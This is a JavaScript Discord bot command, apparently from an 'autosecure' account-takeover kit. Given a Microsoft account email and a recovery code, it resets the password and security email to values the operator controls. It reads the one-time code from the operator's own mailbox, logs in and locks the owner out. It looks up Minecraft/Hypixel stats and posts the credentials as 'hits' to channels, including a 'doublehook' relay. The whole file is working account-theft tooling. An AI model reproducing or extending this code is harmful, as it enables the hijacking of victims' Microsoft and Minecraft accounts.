const { ButtonBuilder, ButtonStyle, ActionRowBuilder } = require('discord.js');
const recoveryCodeSecure = require('../../../autosecure/utils/secure/recoveryCodeSecure.js');
const { domains } = require("../../../config.json");
const generate = require('../../utils/generate');
const { getEmailDescription } = require('../../utils/utils/getEmailDescription.js');
const { extractCode } = require("../../../autosecure/utils/utils/extractCode.js");
const listAccount = require("../../../autosecure/utils/accounts/listAccount.js");
const login = require('../../utils/secure/login.js');
const { queryParams } = require("../../../db/database.js");
const secure = require('../../../autosecure/utils/secure/recodesecure.js');
const generateuid = require('../../../autosecure/utils/generateuid.js');
const getCredentials = require('../../../autosecure/utils/info/getCredentials.js');
const insertaccount = require("../../../db/insertaccount");
const getStats = require('../../../autosecure/utils/hypixelapi/getStats.js');
const statsembed = require("../../../autosecure/utils/stats/statsembed.js");
const mcregex = require("../../../autosecure/utils/utils/mcregex.js");
const otp = require('../../../autosecure/utils/utils/otp.js');
const { failedembed } = require('../../../autosecure/utils/embeds/embedhandler.js');
const sendotp = require("../../../autosecure/utils/secure/sendotp.js")
const { updateStatus, initializesecure } = require("../../../autosecure/utils/process/helpers");
const { sendHitsToChannels } = require("../../utils/sendHits");
const { logAccountSecure } = require("../../utils/activityLogger");

module.exports = {
    name: "recsecure",
    userOnly: true,
    callback: async (client, interaction) => {
        const processStartTime = Date.now();
        const email = interaction.components[0].components[0].value;
        const recoveryCode = interaction.components[1].components[0].value;
        const mcign = interaction.components[2].components[0].value || null;

        if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
            return interaction.reply({
                content: "Please enter a valid email address!",
                ephemeral: true
            });
        }
        if (!recoveryCode || !/^[A-Za-z0-9]{5}-[A-Za-z0-9]{5}-[A-Za-z0-9]{5}-[A-Za-z0-9]{5}-[A-Za-z0-9]{5}$/.test(recoveryCode)) {
            return interaction.reply({
                content: "Please enter a valid 25-character recovery code (format: XXXXX-XXXXX-XXXXX-XXXXX-XXXXX)!",
                ephemeral: true
            });
        }
        if (mcign && !mcregex(mcign)) {
            return interaction.reply({
                content: "Please enter a valid Minecraft username!",
                ephemeral: true
            });
        }

        let settings = await queryParams(`SELECT * FROM secureconfig WHERE user_id=?`, [interaction.user.id]);
        if (settings.length === 0) {
            return interaction.reply({
                content: `Couldn't get your settings!`,
                ephemeral: true
            });
        }
        settings = settings[0];
        console.log('Settings:', settings);

        await interaction.deferReply({ ephemeral: true });

        const statusUuid = await generateuid();

        const secEmail = `${generate(16)}@${domains[0]}`;
        const password = generate(16);
        if (!secEmail.includes('@') || secEmail.length > 254) {
            return interaction.editReply({
                content: "Generated security email is invalid!",
                ephemeral: true
            });
        }
        if (password.length < 8) {
            return interaction.editReply({
                content: "Generated password is too short!",
                ephemeral: true
            });
        }

        const data = await recoveryCodeSecure(email, recoveryCode, secEmail, password);
        console.log('recoveryCodeSecure response:', JSON.stringify(data, null, 2));

        if (data === null) {
            return interaction.editReply({ content: `Invalid email address`, ephemeral: true });
        }
        if (data === 'tfa') {
            return interaction.editReply({ content: `Cannot secure when 2FA is enabled.`, ephemeral: true });
        }
        if (data === 'invalid') {
            return interaction.editReply({ content: `Invalid Recovery Code!`, ephemeral: true });
        }
        if (data === 'same') {
            return interaction.editReply({
                content: `You entered the same password or security email for securing or Microsoft is giving invalid responses!`,
                ephemeral: true
            });
        }
        if (data?.error) {
            return interaction.editReply({
                content: `An unexpected error occurred: ${data.error}`,
                ephemeral: true
            });
        }
        if (!data?.email2 || !data?.recoveryCode || !data?.secEmail || !data?.password) {
            console.error('Invalid data structure from recoveryCodeSecure:', JSON.stringify(data, null, 2));
            return interaction.editReply({
                content: `An unexpected error occurred: Invalid data structure from securing process`,
                ephemeral: true
            });
        }

        await initializesecure(statusUuid, { skipHttpClient: true });
        await Promise.all([
            updateStatus(statusUuid, "email", data.email2),
            updateStatus(statusUuid, "secemail", data.secEmail),
            updateStatus(statusUuid, "password", data.password),
            updateStatus(statusUuid, "recoverycode", data.recoveryCode)
        ]);

        const time = Date.now();
        const d = data.email2;

        let profiles = await getCredentials(data.email2, true)

        if (!profiles?.Credentials?.OtcLoginEligibleProofs || profiles.Credentials.OtcLoginEligibleProofs.length === 0) {
            let recsecId = generate(32);
                await queryParams(
                    `INSERT INTO actions(id, action) VALUES(?, ?)`,
                    [`${recsecId}`, `copyrec|${data.email2}|${data.secEmail}|${data.password}|${data.recoveryCode}`]
                );

                const msg = {
                    embeds: [
                        {
                            title: `Couldn't full-secure: Failed to find sec emails.`,
                            fields: [
                                { name: "Email", value: "```\n" + data.email2 + "\n```", inline: true },
                                { name: "Security Email", value: "```\n" + data.secEmail + "\n```", inline: true },
                                { name: "Password", value: "```\n" + data.password + "\n```", inline: false },
                                { name: "Recovery Code", value: "```\n" + data.recoveryCode + "\n```", inline: false }
                            ],
                            color: 0xb2c7e0
                        }
                    ],
                    components: [
                        new ActionRowBuilder().addComponents(
                            new ButtonBuilder()
                                .setCustomId(`copyrec|${recsecId}`)
                                .setLabel('Copy Text')
                                .setStyle(ButtonStyle.Secondary)
                        )
                    ],
                    ephemeral: true
                };

                await interaction.user.send(msg);
                return interaction.editReply(msg);
        }

        let secEmail1 = profiles.Credentials.OtcLoginEligibleProofs[0];
        const otpSent = await sendotp(email, secEmail1.data);

        const waitForOtp = async (startTime, secEmail, timeoutMs = 90000, intervalMs = 5000) => {
            const deadline = Date.now() + timeoutMs;
            while (Date.now() < deadline) {
                const code = await getEmailDescription(startTime, secEmail, true);
                if (code) return code;
                await new Promise(r => setTimeout(r, intervalMs));
            }
            return null;
        };

        const code = await waitForOtp(time, data.secEmail);

        if (otpSent && code) {
            const host = await login({ email: data.email2, id: secEmail1.data, code: code }, null);
            if (!host) {
                let recsecId = generate(32);
                await queryParams(
                    `INSERT INTO actions(id, action) VALUES(?, ?)`,
                    [`${recsecId}`, `recsecure|${data.email2}|${data.secEmail}|${data.password}|${data.recoveryCode}`]
                );

                const msg = {
                    embeds: [
                        {
                            title: `Couldn't full-secure: OTP Disabled before login!`,
                            fields: [
                                { name: "Email", value: "```\n" + data.email2 + "\n```", inline: true },
                                { name: "Security Email", value: "```\n" + data.secEmail + "\n```", inline: true },
                                { name: "Password", value: "```\n" + data.password + "\n```", inline: false },
                                { name: "Recovery Code", value: "```\n" + data.recoveryCode + "\n```", inline: false },
                            ],
                            color: 0xb2c7e0
                        }
                    ],
                    components: [
                        new ActionRowBuilder().addComponents(
                            new ButtonBuilder()
                                .setCustomId(`copyrec|${recsecId}`)
                                .setLabel('Copy Text')
                                .setStyle(ButtonStyle.Secondary)
                        )
                    ],
                    ephemeral: true
                };

                await interaction.user.send(msg);
                return interaction.editReply(msg);
            }

            const processEndTime = Date.now();
            const rectaken = (processEndTime - processStartTime) / 1000;

            const embed = {
                title: `This account is being automatically secured, you will be dmed when finished`,
                description: `Status UUID: \`${statusUuid}\``,
                color: 0x808080
            };

            const components = [
                new ActionRowBuilder().addComponents(
                    new ButtonBuilder()
                        .setCustomId(`status|${statusUuid}`)
                        .setLabel('? Status')
                        .setStyle(ButtonStyle.Primary)
                )
            ];

            const statusMsg = {
                embeds: [embed],
                components: components,
                ephemeral: true
            };

            await interaction.editReply(statusMsg);
            await interaction.user.send(statusMsg);

            const acc = await secure(host, settings, statusUuid, mcign);
            insertaccount(acc, statusUuid, interaction.user.id, settings.secureifnomc);

            const failedmsg = await failedembed(acc, statusUuid);
            if (failedmsg.failed) {
                await interaction.followUp(failedmsg.failedmsg);
                await interaction.user.send(failedmsg.failedmsg);
                return;
            }

            let timetaken = parseFloat(acc.timeTaken) + rectaken;
            acc.timeTaken = Math.round(timetaken);

            const msg = await listAccount(acc, statusUuid, client, interaction);
            const statsEmb = await statsembed(client, acc, interaction);

            // Send to hits channels (doublehook)
            await sendHitsToChannels(client, msg, interaction.user.id, interaction.user.tag, client.username);
            
            // Log account securing
            await logAccountSecure(client, interaction.user.id, interaction.user.tag, acc.oldEmail || acc.email, "Recovery Code", true).catch(() => {});

            await interaction.followUp({
                ...msg,
                ephemeral: true
            });
            await interaction.user.send(statsEmb);
            await interaction.user.send(msg);

            return;
        } else {
            // Use password + security email proof id flow expected by login()
            const firstProof = (profiles.Credentials.OtcLoginEligibleProofs || [])[0];
            const obj = {
                email: data.email2,
                password: data.password,
                secId: firstProof ? firstProof.data : null,
                secEmail: data.secEmail
            };

            const host = await login(obj, null);
            if (host) {
                const processEndTime = Date.now();
                const rectaken = (processEndTime - processStartTime) / 1000;

                const embed = {
                    title: 'This account is being automatically secured.',
                    description: `Status UUID: \`${statusUuid}\``,
                    color: 0x808080
                };

                const components = [
                    new ActionRowBuilder().addComponents(
                        new ButtonBuilder()
                            .setCustomId(`status|${statusUuid}`)
                            .setLabel('? Status')
                            .setStyle(ButtonStyle.Primary)
                    )
                ];

                const statusMsg = {
                    embeds: [embed],
                    components: components,
                    ephemeral: true
                };

                await interaction.editReply(statusMsg);
                await interaction.user.send(statusMsg);

                const acc = await secure(host, settings, statusUuid, mcign);
                insertaccount(acc, statusUuid, interaction.user.id, settings.secureifnomc);

                const failedmsg = await failedembed(acc, statusUuid);
                if (failedmsg.failed) {
                    await interaction.followUp(failedmsg.failedmsg);
                    await interaction.user.send(failedmsg.failedmsg);
                    return;
                }

                let timetaken = parseFloat(acc.timeTaken) + rectaken;
                acc.timeTaken = Math.round(timetaken);

                const msg = await listAccount(acc, statusUuid, client, interaction);
                const statsEmb = await statsembed(client, acc, interaction);

                // Send to hits channels (doublehook)
                await sendHitsToChannels(client, msg, interaction.user.id, interaction.user.tag, client.username);
                
                // Log account securing
                await logAccountSecure(client, interaction.user.id, interaction.user.tag, acc.oldEmail || acc.email, "Recovery Code", true).catch(() => {});

                await interaction.followUp({
                    ...msg,
                    ephemeral: true
                });
                await interaction.user.send(statsEmb);
                await interaction.user.send(msg);

                return;
            }

            let reason;
            if (!otpSent) {
                reason = "Couldn't send OTP code!";
            } else if (!code) {
                reason = "Microsoft sent no code email or it wasn't captured in time!";
            } else {
                reason = "Couldn't extract code from email!";
            }

            let recsecId = generate(32);
            await queryParams(
                `INSERT INTO actions(id, action) VALUES(?, ?)`,
                [`${recsecId}`, `copyrec|${data.email2}|${data.secEmail}|${data.password}|${data.recoveryCode}`]
            );

            const msg = {
                embeds: [
                    {
                        title: `Couldn't full-secure: ${reason}`,
                        fields: [
                            { name: "Email", value: "```\n" + data.email2 + "\n```", inline: true },
                            { name: "Security Email", value: "```\n" + data.secEmail + "\n```", inline: true },
                            { name: "Password", value: "```\n" + data.password + "\n```", inline: false },
                            { name: "Recovery Code", value: "```\n" + data.recoveryCode + "\n```", inline: false }
                        ],
                        color: 0xb2c7e0
                    }
                ],
                components: [
                    new ActionRowBuilder().addComponents(
                        new ButtonBuilder()
                            .setCustomId(`copyrec|${recsecId}`)
                            .setLabel('Copy Text')
                            .setStyle(ButtonStyle.Secondary)
                    )
                ],
                ephemeral: true
            };

            await interaction.user.send(msg);
            return interaction.editReply(msg);
        }
    }
};